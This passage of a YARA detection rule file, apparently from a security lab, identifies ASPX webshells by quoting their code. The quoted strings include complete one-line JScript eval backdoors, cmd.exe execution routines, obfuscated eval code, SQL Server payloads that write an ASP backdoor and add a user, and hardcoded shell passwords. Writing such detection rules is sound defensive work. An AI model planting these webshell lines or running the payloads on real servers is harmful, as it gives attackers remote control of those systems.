        $s9 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s10 = "\" OnClick=\"Ybg\"></asp:LinkButton> | <asp:LinkButton ID=\"xxzE\" runat=\"server\" Text=\"Cmd" fullword ascii
        $s11 = "System.Net.WebClient ss = new System.Net.WebClient();" fullword ascii
        $s12 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> " fullword ascii
        $s13 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
        $s14 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s15 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";  //" fullword ascii
        $s16 = ") ?')){Bin_PostBack('kRXgt','\"+MVVJ(AXSbb.Value+Bin_folder.Name)+\"')};\\\">" fullword ascii
        $s17 = "Ip : <input class=\"input\" runat=\"server\" id=\"eEpm\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s18 = "</a></span><span id=\"Bin_Span_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s19 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"rAQ\" value=\"1\"/> " fullword ascii
        $s20 = ": <input class=\"input\" runat=\"server\" id=\"dNohJ\" type=\"text\" size=\"20\" value=\"localadministrator\"/></td>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_4a6874e956c14a95b402a9d8f26dad4f574d2efd
{
    meta:
        description = "aspx - file 4a6874e956c14a95b402a9d8f26dad4f574d2efd.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e821cef034dcfc77e87551596d8417b643742e1fac6c913a1bed98e53139327b"
    strings:
        $s1 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.DateTime).Value = ((Text" fullword ascii
        $s2 = "<asp:Button id=\"btnExecute\" onclick=\"btnExecute_Click\" runat=\"server\" Text=\"Execute Query\"></asp:Button>" fullword ascii
        $s3 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Real).Value = ((TextBox)" fullword ascii
        $s4 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.SmallInt).Value = ((Text" fullword ascii
        $s5 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.TinyInt).Value = uint.Pa" fullword ascii
        $s6 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Decimal).Value = decimal" fullword ascii
        $s7 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Bit).Value = ((TextBox)d" fullword ascii
        $s8 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.BigInt).Value = ((TextBo" fullword ascii
        $s9 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NChar).Value = ((TextBox" fullword ascii
        $s10 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Float).Value = float.Par" fullword ascii
        $s11 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Int).Value = ((TextBox)d" fullword ascii
        $s12 = "sqlCommand.Parameters.Add(\"@procedure_name\", SqlDbType.NVarChar, 390).Value = cboSps.SelectedItem.Value;" fullword ascii
        $s13 = "<asp:Button id=\"btnExecute\" onclick=\"btnExecute_Click\" runat=\"server\" Text=\"Execute Query\"></asp:But" fullword ascii
        $s14 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NVarChar, int.Parse(((Ta" fullword ascii
        $s15 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.VarChar, int.Parse(((Tab" fullword ascii
        $s16 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Char, int.Parse(((TableC" fullword ascii
        $s17 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NText, int.Parse(((Table" fullword ascii
        $s18 = "sqlCommand.Parameters[((TableCell)dataGridItem.Controls[0]).Text].Direction = ParameterDirection.InputOutput;" fullword ascii
        $s19 = "sqlCommand.CommandType = CommandType.StoredProcedure;" fullword ascii
        $s20 = "<asp:Button id=\"btnGetParams\" onclick=\"btnGetParameters_Click\" runat=\"server\" Text=\"Get Parameters\"></asp:Button>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3b369bed5a08fa7880849cacc329fe5e6fbe3859
{
    meta:
        description = "aspx - file 3b369bed5a08fa7880849cacc329fe5e6fbe3859.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "eb1e648fb0dd925f74acd66a6336622010e99d96e25dcc23af63b429efcec8b7"
    strings:
        $s1 = "<% @Page Language=\"Jscript\"%><%eval(Request.Item[\"hucxsz\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_0378b9a95ed3af4943c6a58d87345dc944b881f7
{
    meta:
        description = "aspx - file 0378b9a95ed3af4943c6a58d87345dc944b881f7.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a4ea5fc7d14f27bbf0697782e4a948cd50442164b1d84e7b23e6463da853a653"
    strings:
        $x1 = "href=\"http://alikaptanoglu.blogspot.com\" target=\"_blank\">Shell sql tool</a> All Rights Reserved.</div></div>" fullword ascii
        $x2 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
        $x3 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
        $s4 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s6 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s7 = "Blog: http://alikaptanoglu.blogspot.com" fullword ascii
        $s8 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";//admin" fullword ascii
        $s9 = "E-mail : ali_kaptanoglu@hotmail.com" fullword ascii
        $s10 = "<SCRIPT SRC=http://r57.gen.tr/yazciz/ciz.js></SCRIPT>" fullword ascii
        $s11 = "an_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s12 = "<title>ASPXspy</title>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_100efd90701a61013d424a3030aec6474ae2fb8b
{
    meta:
        description = "aspx - file 100efd90701a61013d424a3030aec6474ae2fb8b.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "22524647342d2163ba1880c32dc23644152b555299370da89a0c7992c8320a08"
    strings:
        $x1 = "Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));" fullword ascii
        $x2 = "processStartInfo.FileName = \"cmd.exe\";" fullword ascii
        $s3 = "processStartInfo.Arguments = \"/c \" + command;" fullword ascii
        $s4 = "processStartInfo.UseShellExecute = false;" fullword ascii
        $s5 = "private string ExecuteCommand(string command)" fullword ascii
        $s6 = "<td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" /></td>" fullword ascii
        $s7 = "<td><asp:TextBox ID=\"txtCommand\" runat=\"server\" Width=\"820px\"></asp:TextBox></td>" fullword ascii
        $s8 = "protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
        $s9 = "processStartInfo.RedirectStandardOutput = true;" fullword ascii
        $s10 = "ProcessStartInfo processStartInfo = new ProcessStartInfo();" fullword ascii
        $s11 = "using (StreamReader streamReader = process.StandardOutput)" fullword ascii
        $s12 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
        $s13 = "Process process = Process.Start(processStartInfo);" fullword ascii
        $s14 = "<td><asp:TextBox id=\"txtAuthKey\" runat=\"server\"></asp:TextBox></td>" fullword ascii
        $s15 = "<form id=\"formCommand\" runat=\"server\">" fullword ascii
        $s16 = "private const string AUTHKEY = \"woanware\";" fullword ascii
        $s17 = "/// <param name=\"command\"></param>" fullword ascii
        $s18 = "<td width=\"30\">Command:</td>" fullword ascii
        $s19 = "<%@ Import namespace=\"System.Diagnostics\"%>" fullword ascii
        $s20 = "private const string HEADER = \"<html>\\n<head>\\n<title>command</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,table,p,pre," ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f8707c14e3171f1219c22ba9838668385b994d69
{
    meta:
        description = "aspx - file f8707c14e3171f1219c22ba9838668385b994d69.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ee2efc1ea4a565b0bea76e09c14ee12ac36f898f740f39ff33fdd950a788232f"
    strings:
        $s1 = "<% @page Language=\"Jscript\"><%eval(Request.item[\"c\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_56b7704bd117b093a59df0e9535879e37bccc032
{
    meta:
        description = "aspx - file 56b7704bd117b093a59df0e9535879e37bccc032.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8b5cd1ca392892e6343a6b7d9ba02cf1729c61a5e0eef19a9dd81240a7d3361f"
    strings:
        $s1 = "\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u\"+\"e\"/*-/*-*/+\"s\"+\"t\"+            " fullword ascii
        $s2 = "(/*-/*-*/P/*-/*-*/,/*-/*-*/\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"/*-/*-*/);%>" fullword ascii
        $s3 = "\"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]\"+            " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_2517657fc02b9e106260154f073bd5e967ba6936
{
    meta:
        description = "aspx - file 2517657fc02b9e106260154f073bd5e967ba6936.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f82944c409e87d472687a6e0a06f19cf0c0113844ea229bdd7be58bd77d6c0d3"
    strings:
        $s1 = "SqlDataReader reader = cmd.ExecuteReader();" fullword ascii
        $s2 = "Response.Write( String.Format(\"{0}\\t\", reader.GetName(i)) );" fullword ascii
        $s3 = "SqlCommand cmd = new SqlCommand(sql, conn);" fullword ascii
        $s4 = "<%@ Import Namespace=\"System.Web.UI.WebControls\" %>" fullword ascii
        $s5 = "Response.Write( String.Format(\"{0}\\t\", reader[i] ) );" fullword ascii
        $s6 = "for( int i=0; i<reader.FieldCount; i++ ){" fullword ascii
        $s7 = "if ((Request.QueryString[\"sql\"] != null) && (Request.QueryString[\"conn\"] != null )){" fullword ascii
        $s8 = "using (SqlConnection conn = new SqlConnection( connstr ))" fullword ascii
        $s9 = "for(int i=0;i<reader.FieldCount;i++)" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( all of them ) ) or ( all of them )
}

rule sig_4824681545772fb36af9115120dda094943a6940
{
    meta:
        description = "aspx - file 4824681545772fb36af9115120dda094943a6940.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5c87ec9fbe71e3bdac867de4462c41cd28f1e50b31b1cd7e4fc6371a12f90db4"
    strings:
        $s1 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s2 = ".4.0;Data Source=E:\\database.mdb\">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID=\"QcZPA\" runat=\"server\" Text=\"" fullword ascii
        $s3 = ".Bin_Style_Login{font-size: 12px; font-family:System;background-color:#fff;border:2px solid #ddd;}" fullword ascii
        $s4 = "<asp:Button ID=\"ZSnXu\" runat=\"server\" Text=\"----------OK! Let's Go.\" CssClass=\"Bin_Style_Login\" OnClick=\"xVm\"/><p/>" fullword ascii
        $s5 = "<asp:TextBox ID=\"HRJ\" runat=\"server\" Columns=\"25\" CssClass=\"Bin_Style_Login\" ></asp:TextBox>" fullword ascii
        $s6 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
        $s7 = ": <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"serv" ascii
        $s8 = ".head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:BLACK;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
        $s9 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s10 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> " fullword ascii
        $s11 = "public string Password=\"b007bc64d4a1e28567baf728abe003c0\";//r00ts" fullword ascii
        $s12 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
        $s13 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s14 = ") ?')){Bin_PostBack('kRXgt','\"+MVVJ(AXSbb.Value+Bin_folder.Name)+\"')};\\\">" fullword ascii
        $s15 = "Ip : <input class=\"input\" runat=\"server\" id=\"eEpm\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s16 = "Ip : <input class=\"input\" runat=\"server\" id=\"llH\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s17 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"rAQ\" value=\"1\"/> " fullword ascii
        $s18 = "<div id=\"ljtzC\" runat=\"server\" style=\" margin:300px 500px\" enableviewstate=\"false\" visible=\"false\" >" fullword ascii
        $s19 = ": <input class=\"input\" runat=\"server\" id=\"dNohJ\" type=\"text\" size=\"20\" value=\"localadministrator\"/></td>" fullword ascii
        $s20 = "<td ><span style=\"float:right;\">Hello! Hack.  By Faker</span><span id=\"Bin_Span_Sname\" runat=\"server\" enableviewstate=\"tr" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule c7c9722b01d0c9d608e03df0d99c38047604412e
{
    meta:
        description = "aspx - file c7c9722b01d0c9d608e03df0d99c38047604412e.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e60bd43882445993cc267cf25dbd20457b3bb1318aaae936d21cea55e0aa0967"
    strings:
        $x1 = "System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(sqlStr, connection);" fullword ascii
        $s2 = "System.Data.SqlClient.SqlDataAdapter da = new System.Data.SqlClient.SqlDataAdapter(cmd);" fullword ascii
        $s3 = "System.Data.SqlClient.SqlConnection connection = new System.Data.SqlClient.SqlConnection(connectionString);" fullword ascii
        $s4 = "file.Write(@\"<html><head><meta http-equiv=content-type content=" fullword ascii
        $s5 = "System.IO.StreamWriter file = new System.IO.StreamWriter(filePath + (z+1) +\"_\"+fileName, false, Encoding.UTF8);" fullword ascii
        $s6 = "string connectionString = \"server=\"+serverIP+\";database=\"+database+\";uid=\"+user+\";pwd=\"+pass;" fullword ascii
        $s7 = "By:<a href=\"http://hi.baidu.com/" fullword ascii
        $s8 = "System.Data.DataSet ds = new System.Data.DataSet();" fullword ascii
        $s9 = "System.Data.DataRow dataRow = dataTable.Rows[i];" fullword ascii
        $s10 = "if (serverIP != null & database != null & user != null & pass != null & tableName != null & fileName != null)" fullword ascii
        $s11 = "System.Data.DataTable dataTable = ds.Tables[0];" fullword ascii
        $s12 = "<asp:TextBox ID=\"txtPass\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s13 = "<asp:TextBox ID=\"txtUser\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s14 = "lblInfo.ForeColor = System.Drawing.Color.Red;" fullword ascii
        $s15 = "<asp:TextBox ID=\"txtTableName\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s16 = "<title>Export Table</title></head><body>\");" fullword ascii
        $s17 = "<asp:TextBox ID=\"txtDatabase\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s18 = "<asp:TextBox ID=\"txtColName\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s19 = "<asp:TextBox ID=\"txtServerIP\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s20 = "<asp:TextBox ID=\"txtFileName\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_1206c22de8d51055a5e3841b4542fb13aa0f97dd
{
    meta:
        description = "aspx - file 1206c22de8d51055a5e3841b4542fb13aa0f97dd.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "655b22ac293b2717617da3c9e1a87c6f22a556c788adced2a2f97610f079d970"
    strings:
        $s1 = "this.Lb_msg.Text = System.DateTime.Now.ToString()+\"  State: <b>\" + th.ThreadState.ToString() +\"</b>  Packets: \"+pack" fullword ascii
        $s2 = "this.Lb_msg.Text = System.DateTime.Now.ToString() + \"  State: <b>stoping. Click \\\"Refresh\\\" again to see if thread i" fullword ascii
        $s3 = "logfile = Server.MapPath(\"w\" + System.DateTime.Now.ToFileTime() + \".txt\");" fullword ascii
        $s4 = "if (stoptime.Year == (System.DateTime.Now.Year - 8))" fullword ascii
        $s5 = "if (this.txtlogfile.Text == \"\" || txtpackets.Text.Length < 1 || txtport.Text == \"\") return;" fullword ascii
        $s6 = "proException += \"<br>last time stop at \" + System.DateTime.Now.ToString();" fullword ascii
        $s7 = "<a href=\" http://user.qzone.qq.com/356497021\">1</a> " fullword ascii
        $s8 = "<a href=\"http://user.qzone.qq.com/356497021\">2</a> " fullword ascii
        $s9 = "<asp:TextBox ID=\"txtlogfile\" runat=\"server\"   width=\"90%\" Text=\"log.log\" ></asp:TextBox>" fullword ascii
        $s10 = "<div id=b>Powered by <a href=\"//user.qzone.qq.com/356497021\"> " fullword ascii
        $s11 = "System.DateTime nextDay = System.DateTime.Now.AddDays(1);" fullword ascii
        $s12 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
        $s13 = "mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);" fullword ascii
        $s14 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
        $s15 = "static DateTime stoptime = System.DateTime.Now.AddYears(-8);" fullword ascii
        $s16 = "<asp:CheckBox ID=\"s_http_post\" runat=\"server\" />" fullword ascii
        $s17 = "<asp:TextBox ID=\"txtport\" Text=\"0\"  width=\"90%\" runat=\"server\"></asp:TextBox>" fullword ascii
        $s18 = "if (!logIt && my_s_http_post)" fullword ascii
        $s19 = "mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);" fullword ascii
        $s20 = "<%@ Import Namespace=\"System.Net.NetworkInformation\" %>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8d81589ee48fa4140adc8a0f3714fce012f7ba54
{
    meta:
        description = "aspx - file 8d81589ee48fa4140adc8a0f3714fce012f7ba54.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2b7cce5da1fa31a0a688aa3c34b4c2ba33768596354ddeca3f9edaf5e4634da7"
    strings:
        $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"zOVO\" CssClass=\"list\"" ascii
        $x2 = "OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:" ascii
        $x3 = "ias.mdb','select shell(&#34;cmd.exe /c %6E%65%74%20%75%73%65%72 root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Val" ascii
        $s4 = "stItem Value=\"sp_makewebtask @outputfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''" ascii
        $s5 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s6 = "roc('sp_OACreate','odsole70.dll')\">Add sp_oacreate</asp:ListItem><asp:ListItem Value=\"Exec sp_configure 'show advanced options" ascii
        $s7 = ".Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}" fullword ascii
        $s8 = "<a href=\"http://www.on-e.cn\" target=\"_blank\">ON-e.cn</a> All Rights Reserved.</div></div>" fullword ascii
        $s9 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
        $s10 = ": <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"serv" ascii
        $s11 = "<td ><span style=\"float:right;\"><a href=\"http://www.on-e.cn\" target=\"_blank\">" fullword ascii
        $s12 = "0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');%64%65%63%6C%61%72%65 " ascii
        $s13 = "\\4.0\\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32" ascii
        $s14 = "Item Value=\"\">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('%78%70%5F%63%6D%64%73" ascii
        $s15 = ".head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#073b07;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
        $s16 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s17 = "\" OnClick=\"Ybg\"></asp:LinkButton> | <asp:LinkButton ID=\"xxzE\" runat=\"server\" Text=\"Cmd" fullword ascii
        $s18 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> " fullword ascii
        $s19 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
        $s20 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_13e4ba9c670fc852f0ff80b1cbad5acb4afe7ce8
{
    meta:
        description = "aspx - file 13e4ba9c670fc852f0ff80b1cbad5acb4afe7ce8.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6661796a2df072c9d558a61ed53c817a55fda83c1094be384f847a0b1063a07d"
    strings:
        $s1 = "System.IO.StreamWriter sw = new System.IO.StreamWriter(this.txtPath.Text,true,System.Text.Encoding.GetEncoding(\"gb2312\"));" fullword ascii
        $s2 = "System.IO.StreamWriter sw = new System.IO.StreamWriter(this.txtPath.Text,true,System.Text.Encoding.GetEncoding(\"gb23" fullword ascii
        $s3 = ":<asp:TextBox runat=\"server\" ID=\"txtContext\" Width=\"400px\" Height=\"250px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii
        $s4 = "if (password.Equals(this.txtPass.Text))" fullword ascii
        $s5 = "www.huc08.com</title>" fullword ascii
        $s6 = ":<asp:TextBox runat=\"server\" ID=\"txtPass\" Width=\"400px\"></asp:TextBox>" fullword ascii
        $s7 = ":<asp:TextBox runat=\"server\" ID=\"txtPath\" Width=\"400px\" ></asp:TextBox>" fullword ascii
        $s8 = "this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\"PATH_INFO\"]);" fullword ascii
        $s9 = "string password = \"TNTHK\";" fullword ascii
        $s10 = "<asp:Button runat=\"server\" ID=\"btnUpload\" text=\"" fullword ascii
        $s11 = ":<asp:Label runat=\"server\" ID=\"lblthispath\" Text=\"\"></asp:Label>" fullword ascii
        $s12 = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" validateRequest=\"false\"%>" fullword ascii
        $s13 = "<script language=\"c#\" runat=\"server\">" fullword ascii
        $s14 = "void btnUpload_Click(object sender, EventArgs e)" fullword ascii
        $s15 = "sw.Write(this.txtContext.Text);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule sig_0f8a4b1a9436476f570d004240efb2c9bbc19aa6
{
    meta:
        description = "aspx - file 0f8a4b1a9436476f570d004240efb2c9bbc19aa6.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "89cbea413c850aab5d67c4fa4798cdb9b62f56083e2f9362292a5e48423fee85"
    strings:
        $x1 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
        $x2 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $s3 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
        $s4 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s6 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s7 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";//" fullword ascii
        $s8 = "an_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s9 = "<title>ASPXspy</title>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule cb91f989329f89add03de9ae58bc47e6c7b7f86c
{
    meta:
        description = "aspx - file cb91f989329f89add03de9ae58bc47e6c7b7f86c.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "db6e4fc737611e6ac4836821f92ed243df63777063190ad58f6ce1e36be08900"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Headers[\"e1044\"], \"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_54a5620d4ea42e41beac08d8b1240b642dd6fd7c
{
    meta:
        description = "aspx - file 54a5620d4ea42e41beac08d8b1240b642dd6fd7c.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "618af77ea64d895ce42f1e3eec1376408a0b12b3ce7a0ab09d9b44c9541dcc4a"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(eval(Request.Item[\"w\"],\"unsafe\"));%>" fullword ascii
        $s2 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%>" fullword ascii
